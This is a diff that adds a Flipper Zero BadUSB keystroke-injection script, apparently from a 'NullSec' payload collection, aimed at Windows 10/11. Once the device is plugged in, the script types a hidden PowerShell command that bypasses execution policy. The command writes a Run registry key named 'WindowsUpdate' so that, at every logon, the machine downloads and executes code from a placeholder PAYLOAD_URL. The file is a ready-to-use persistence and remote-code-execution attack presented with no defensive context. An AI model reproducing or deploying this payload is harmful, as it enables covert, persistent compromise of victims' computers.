@@ -1,0 +1,11 @@
+REM ========================================
+REM NullSec Flipper Zero BadUSB
+REM Payload: Registry Persistence
+REM Target: Windows 10/11
+REM ========================================
+REM CONFIGURE: Change PAYLOAD_URL to your hosted payload
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass -c "New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value 'powershell -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(''PAYLOAD_URL'')\"' -PropertyType String -Force"
+ENTER
